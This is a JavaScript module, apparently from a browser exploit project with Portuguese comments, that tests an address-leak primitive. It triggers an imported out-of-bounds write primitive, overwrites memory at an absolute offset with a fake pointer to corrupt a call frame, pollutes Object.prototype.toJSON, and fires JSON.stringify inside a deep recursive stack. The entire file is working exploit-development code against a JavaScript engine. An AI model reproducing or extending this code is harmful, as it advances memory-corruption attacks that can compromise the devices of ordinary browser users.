// js/script3/testMemoryLeakViaJsonTC.mjs (ETAPA DE DEPURAÇÃO: REMOVIDO TRY/CATCH)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex, AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

const CF_CORRUPT_CONFIG = {
    CRASH_OFFSET: 0x70,
    FAKE_POINTER_TO_OBJECT: new AdvancedInt64("0x0108230700001337"),
};

let leaked_address = null;
function build_stack_and_trigger(depth, victim_obj) {
    if (depth <= 0) {
        try {
            JSON.stringify(victim_obj);
        } catch(e) {
            logS3(`ERRO DENTRO DA PILHA DE CHAMADAS: ${e.message}`, "warn", "build_stack_and_trigger");
        }
        return;
    }
    build_stack_and_trigger(depth - 1, victim_obj);
}

export async function testAddrofPrimitive() {
    const FNAME = "testAddrofPrimitive";
    logS3(`--- Iniciando Tentativa de Leak via Corrupção de CallFrame ---`, "test", FNAME);
    logS3(`   Usando ponteiro falso: ${CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT.toString()}`, "info", FNAME);

    await triggerOOB_primitive();

    const victim = {};
    const ppKey = 'toJSON';

    Object.defineProperty(Object.prototype, ppKey, {
        value: function() {
            logS3(`[${ppKey} Poluído] Chamado! 'this' é do tipo: ${Object.prototype.toString.call(this)}`, "info", FNAME);
            return { executed: true };
        },
        writable: true, configurable: true, enumerable: false
    });

    logS3(`Corrompendo offset ${toHex(CF_CORRUPT_CONFIG.CRASH_OFFSET)} com ponteiro falso...`, "warn", FNAME);
    
    // DEBUG: Bloco try/catch removido para expor o erro real.
    // Esperamos um erro diferente de "SyntaxError" agora.
    oob_write_absolute(CF_CORRUPT_CONFIG.CRASH_OFFSET, CF_CORRUPT_CONFIG.FAKE_POINTER_TO_OBJECT, 8);
    
    await PAUSE_S3(100);

    logS3("Construindo pilha de chamadas e acionando JSON.stringify...", "info", FNAME);
    build_stack_and_trigger(20, victim);

    delete Object.prototype[ppKey];
    clearOOBEnvironment();
    
    logS3("--- Teste de depuração concluído. ---", "info", FNAME);
}
